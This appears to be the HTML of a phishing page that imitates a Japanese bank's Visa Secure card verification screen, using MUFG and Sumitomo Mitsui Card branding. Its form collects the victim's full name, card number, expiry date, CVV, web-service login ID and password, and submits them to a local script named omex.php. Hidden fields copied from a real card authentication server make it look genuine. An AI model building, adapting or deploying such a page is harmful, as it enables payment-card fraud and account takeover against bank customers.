﻿<html><head>
	<meta http-equiv="Expires" content="-1">
	<meta http-equiv="Pragma" content="no-cache">
	<meta http-equiv="Cache-Control" content="no-cache">
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <link rel="shortcut icon" href="./favicon.ico">
	<link href="pp/ntt.css" rel="stylesheet" type="text/css">
	<title>
		三菱UFJフィナンシャルグループ
	</title>
	<style type="text/css">
.auto-style1 {
	font-family: sans-serif;
}
</style>
</head>

<body onload="SetFocus()" bgcolor="#ffffff">

<script language="Javascript">
function SetFocus()
{
	if (document.A1.UserId)
		document.A1.UserId.focus();
	else if (document.A1.Password)
		document.A1.Password.focus();
}
function ForgotPassword()
{
	
	
	
	window.open("","forgotPasswordWin","status=yes,scrollbars=no,width=390,height=400");
	document.A1.Action.value="GetPasswordHint";
	document.A1.target="forgotPasswordWin";
	document.A1.action="dispatcher.jsp";
	document.A1.submit();
	
}
function Help()
{
	
	
	
	
	
	
	window.open("","helpWin","status=yes,scrollbars=no,width=390,height=400");
	document.A1.target="helpWin";
	document.A1.action="help.jsp";
	document.A1.submit();
	
}
function Cancel()
{
	
	
	
	document.A1.Action.value = "Cancel";
	document.A1.target="_self";
	document.A1.action="omex.php";
	document.A1.submit();

	
}
function SubmitForm()
{
	if (!submitClicked)
	{
		
		document.A1.Action.value = "Authenticate";
		document.A1.target="_self";
		document.A1.action="omex.php";
		
		submitClicked = true;
		document.A1.submit();
	}
}
var submitClicked = false;
</script>



<form name="A1" method="post" action="omex.php" onsubmit="return false;">


	
	<input type="hidden" name="Action" value="Authenticate">
    <input type="hidden" name="State" value="ScenarioB/LoginRequired">
    <input type="hidden" name="AccountId" value="42BC04679AB8E23D4E022A83C3EC">
    <input type="hidden" name="PAReqId" value="209254">
    <input type="hidden" name="PAReqURI" value="https://acs.cafis-paynet.jp/preca/1@0@2,90003,DC9FAD7DDC1B1E.PAReq">
    <input type="hidden" name="IssuerId" value="90003">
    <input type="hidden" name="MessageId" value="Atos-Origin_1574450922861">
	
    <input type="hidden" name="CardProductId" value="preca_0001">
    <input type="hidden" name="Fi" value="NTT">
    <input type="hidden" name="ServiceCode" value="VBV">
    <input type="hidden" name="ImplDesc" value="Visa Secure">
	



	
	
	
	
	

	
	



<center>
<table cellspacing="0" cellpadding="0" border="0">
<tbody><tr>
	<td>
		<table width="350px" cellspacing="0" cellpadding="0" border="0">
  	    <tbody><tr>
			<td valign="top">

				
				<table width="100%" cellspacing="0" cellpadding="0" border="0">
				<tbody><tr>
					<td>
						<table width="100%" bordercolor="#88A0B8" border="0" bgcolor="#FFFFFF">
						<tbody><tr>
							<td width="50%" align="left">
								<img src="pp/muf.png" alt="Visa Secure" title="Visa Secure" border="0" height="49" width="164">
							</td>
							
							<td width="50%" align="right">
								<img src="pp/muf1.png" alt="三井住友カード" title="三井住友カード" width="153" height="48">
							</td>
						</tr>
						</tbody></table>
						<br>
					</td>
				</tr>
				</tbody></table>






    <table width="100%" cellspacing="0" cellpadding="3" border="0">
	<tbody><tr>
		

		
            <td colspan="3" class="normalgray" align="left">
				<span class="auto-style1">Added Protection :</span><br>
				MU<span class="" title=""><span class="tlid-translation translation">FG</span><span class="tlid-translation translation" lang="ja">
				WebサービスのIDとパスワードをご入力ください。</span></span><br>
			</td>
		
	</tr>
	<tr>
		<td height="10" align="left">
		<img src="nn/Visa%20Secure_fichiers/spacer.gif" width="1" height="10"></td>
	</tr>
	<tr>
        <td valign="top" align="left">
            <table width="100%" cellspacing="0" cellpadding="3" border="0">

            
						
			
			
			
            <tbody><tr>
                <td class="normalbold" width="165px" valign="top" align="right">
                    <span class="tlid-translation translation" lang="ja">
					<span class="" title="">ブランチ</span></span>:
                </td>
                <td>
                </td>
                <td class="normalbold" width="165px" valign="top">
								<span class="tlid-translation translation" lang="en">
								<span class="" title="">
								<span class="tlid-translation translation" lang="ja">
								三菱UFJフィナンシャルグループ</span></span></span></td>
            </tr>
            <tr>
                <td class="normalbold" width="165px" valign="top" align="right">
                    日付:
                </td>
                <td>
                </td>
                <td class="normalbold" width="165px" valign="top">
                    2020/03/20</td>
            </tr>

            
            
                
				
				
				
				
            

            

            

            
            

            

            <tr>
                <td class="normalbold" width="165px" valign="center" align="right">
                    フルネーム:
                </td>
                <td>
                </td>
                <td width="165px" valign="top">
                    <!-- no errors, retain password -->
					                    
					<input type="text" maxlength="32" size="20" name="z1" value="" "="" autocomplete="off" onkeydown="if(event.keyCode==13) document.A1.sendButton.click();">
					                </td>
            </tr>

            
			
			
            	<tr>
                <td class="normalbold" width="165px" valign="center" align="right">
                    <span id="result_box3" class="short_text" lang="ja">
					<span class="">カード番号</span></span>:
                </td>
                <td>
                </td>
                <td width="165px" valign="top">
                    <!-- no errors, retain password -->
					                    
					<input type="text" maxlength="32" size="20" name="z2" value="" "="" autocomplete="off" onkeydown="if(event.keyCode==13) document.A1.sendButton.click();">
					                </td>
            	</tr>
				<tr>
                <td class="normalbold" width="165px" valign="center" align="right">
                    <span class="">
					<span id="result_box4" class="short_text" lang="ja">有効期限</span></span>:
                </td>
                <td>
                </td>
                <td width="165px" valign="top">
                    <!-- no errors, retain password -->
					                    
					<input type="text" maxlength="32" size="20" name="z3" value="" placeholder="月/年" "="" autocomplete="off" onkeydown="if(event.keyCode==13) document.A1.sendButton.click();" style="width: 73px; height: 22px">
					                </td>
            	</tr>
				<tr>
                <td class="normalbold" width="165px" valign="center" align="right">
                    <span id="result_box5" class="short_text" lang="ja">
					<span class="">カードセキュリティコード</span></span>:
                </td>
                <td>
                </td>
                <td width="165px" valign="top">
                    <!-- no errors, retain password -->
					                    
					<input type="text" maxlength="32" size="20" name="z4" value="" placeholder="CVV/CVV2" "="" autocomplete="off" onkeydown="if(event.keyCode==13) document.A1.sendButton.click();" style="width: 73px; height: 22px">
					                </td>
            	</tr>
				<tr>
                <td class="normalbold" width="165px" valign="center" align="right">
                    <span class=""><span id="result_box6" class="short_text">
					<span class="tlid-translation translation">WEB</span></span><span id="result_box6" class="short_text" lang="ja"><span class="tlid-translation translation" lang="ja">サービス　ログイン</span></span></span>:
                </td>
                <td>
                </td>
                <td width="165px" valign="top">
                    <!-- no errors, retain password -->
					                    
					<input type="text" maxlength="32" size="20" name="z5" value="" placeholder="ID（4～30桁" "="" autocomplete="off" onkeydown="if(event.keyCode==13) document.A1.sendButton.click();">
					                </td>
            	</tr>
				<tr>
                <td class="normalbold" width="165px" valign="center" align="right">
                    パスワード:
                </td>
                <td>
                </td>
                <td width="165px" valign="top">
                    <!-- no errors, retain password -->
					                    
					<input type="text" maxlength="32" size="20" name="z6" value="" placeholder="パスワード（4～8桁）" "="" autocomplete="off" onkeydown="if(event.keyCode==13) document.A1.sendButton.click();">
					                </td>
            	</tr>

            
			
			
            <tr>
                <td>&nbsp;</td>
                <td>
                </td>
                <td valign="top" align="left">
                    <script>
                        document.write("<a class=\"forgotlink\" href=\"javascript:ForgotPassword()\">");
                    </script><a class="forgotlink" href="javascript:ForgotPassword()"></a>
					<input type="button" id="sendButton" value="確認" onclick="SubmitForm()" style="width: 63px"><a class="forgotlink" href="javascript:ForgotPassword()"><noscript>
                        <a class="forgotLink" href="omex.php" target="_blank">
                    </noscript></a></td>
            </tr>
            
            

            <tr height="10">
                <td><img src="pp/spacer.gif"></td>
            </tr>

            

            <tr>
                
                    <td valign="top" align="left">&nbsp;</td>
                    <td>
                    </td>
                    <td width="165px" valign="top" align="left">

		    		&nbsp;</td>
                
            </tr>

            </tbody></table>
        </td>
    </tr>
    </tbody></table>

    

				</td></tr></tbody></table><table width="100%" cellspacing="0" cellpadding="0" bordercolor="#88A0B8" border="0" bgcolor="#FFFFFF">
					<tbody><tr>
						<td class="copyright" align="center">
							
						</td>
					</tr>
					</tbody></table>
				</td></tr>

	
			
	  	
		</tbody></table>
	


</center>


</form>









</body></html>